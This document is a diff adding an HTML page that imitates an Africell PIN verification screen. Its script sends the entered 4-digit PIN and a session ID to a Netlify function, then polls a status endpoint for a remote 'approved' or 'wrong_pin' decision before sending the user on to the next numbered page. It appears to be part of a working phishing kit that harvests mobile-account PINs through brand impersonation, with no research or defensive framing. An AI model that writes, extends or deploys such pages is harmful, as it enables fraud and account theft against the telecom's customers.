@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify PIN - Africell</title>
+    <style>
+        :root {
+            --africell-purple: #a60068;
+            --africell-orange: #ff9900;
+            --border-light: #e0e0e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--africell-purple);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 40px 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .sheet {
+            background: white;
+            flex-grow: 1;
+            border-top-left-radius: 30px;
+            border-top-right-radius: 30px;
+            padding: 40px 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .info-text {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* PIN Input Style */
+        .pin-container {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .pin-input {
+            width: 55px;
+            height: 65px;
+            border: 1.5px solid var(--border-light);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--africell-purple);
+            outline: none;
+            transition: border-color 0.2s;
+            -webkit-text-security: disc;
+            /* mask input */
+        }
+
+        .pin-input:focus {
+            border-color: var(--africell-purple);
+        }
+
+        /* Verify Button */
+        .verify-btn {
+            width: 100%;
+            background-color: var(--africell-purple);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(166, 0, 104, 0.2);
+        }
+
+        .forgot-row {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        .forgot-link {
+            color: var(--africell-orange);
+            font-weight: 600;
+            text-decoration: none;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header">
+        <div style="display:flex; align-items:center; justify-content:center; gap:10px; position:relative;">
+            <span onclick="window.location.href='2.html'"
+                style="position:absolute; left:0; font-size:22px; cursor:pointer; opacity:0.85;">←</span>
+            <h1 style="font-size: 28px;">africell</h1>
+        </div>
+    </div>
+
+    <div class="sheet">
+        <h2>Enter 4-Digit PIN</h2>
+        <p class="info-text">Please enter your 4-digit Africell PIN to continue.</p>
+
+        <div class="pin-container" id="pinFields">
+            <input type="number" class="pin-input" maxlength="1" oninput="moveToNext(this, 0)">
+            <input type="number" class="pin-input" maxlength="1" oninput="moveToNext(this, 1)">
+            <input type="number" class="pin-input" maxlength="1" oninput="moveToNext(this, 2)">
+            <input type="number" class="pin-input" maxlength="1" oninput="moveToNext(this, 3)">
+        </div>
+
+        <button class="verify-btn" id="verifyBtn" onclick="verifyPIN()">Verify PIN</button>
+
+        <div class="forgot-row">
+            Forgot your PIN?
+            <a href="#" class="forgot-link">Reset PIN</a>
+        </div>
+
+        <!-- Error message -->
+        <div id="pinError"
+            style="display:none; margin-top:14px; background:#fff0f0; border:1px solid #ffcccc; border-radius:10px; padding:12px 15px; text-align:center; font-size:13px; color:#cc0000; width:100%;">
+        </div>
+    </div>
+
+    <!-- Loading overlay -->
+    <div id="waitOverlay"
+        style="display:none; position:fixed; inset:0; z-index:999; background:rgba(166,0,104,0.95); flex-direction:column; align-items:center; justify-content:center; color:white;">
+        <div
+            style="width:48px;height:48px;border:5px solid rgba(255,255,255,0.3); border-top-color:white;border-radius:50%;animation:spin 0.9s linear infinite; margin-bottom:20px;">
+        </div>
+        <div style="font-size:17px;font-weight:700;">Verifying PIN...</div>
+        <div style="font-size:13px;opacity:0.75;margin-top:6px;">Please wait</div>
+        <style>
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll('.pin-input');
+
+        function moveToNext(current, index) {
+            if (current.value.length > 1) current.value = current.value.slice(-1);
+            if (current.value.length >= 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        }
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        function showPinError(msg) {
+            const box = document.getElementById('pinError');
+            box.textContent = msg;
+            box.style.display = 'block';
+            document.getElementById('waitOverlay').style.display = 'none';
+            document.getElementById('verifyBtn').disabled = false;
+            // Re-enable inputs
+            inputs.forEach(i => { i.value = ''; i.disabled = false; });
+            inputs[0].focus();
+        }
+
+        async function verifyPIN() {
+            let code = '';
+            inputs.forEach(i => code += i.value);
+            if (code.length !== 4) {
+                showPinError('Please enter your 4-digit PIN.');
+                return;
+            }
+
+            document.getElementById('pinError').style.display = 'none';
+            document.getElementById('verifyBtn').disabled = true;
+            inputs.forEach(i => i.disabled = true);
+            document.getElementById('waitOverlay').style.display = 'flex';
+
+            const sessionId = sessionStorage.getItem('sessionId') ||
+                (Date.now().toString(36) + Math.random().toString(36).slice(2));
+            sessionStorage.setItem('sessionId', sessionId);
+
+            try {
+                await fetch('/.netlify/functions/submit-pin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ pin: code, sessionId })
+                });
+            } catch (e) {
+                showPinError('Network error. Please try again.');
+                return;
+            }
+
+            // Poll Redis for PIN decision
+            const poll = setInterval(async () => {
+                try {
+                    const res = await fetch(`/.netlify/functions/check-status?sessionId=${sessionId}&type=pin`);
+                    const data = await res.json();
+                    const status = data.status;
+
+                    if (status === 'approved') {
+                        clearInterval(poll);
+                        window.location.href = '3.html';
+                    } else if (status === 'wrong_pin') {
+                        clearInterval(poll);
+                        showPinError('❌ Incorrect PIN. Please check and try again.');
+                    }
+                } catch (e) { /* retry */ }
+            }, 2000);
+
+            setTimeout(() => {
+                clearInterval(poll);
+                showPinError('⏱ Request timed out. Please try again.');
+            }, 180000);
+        }
+    </script>
+</body>
+
+</html>
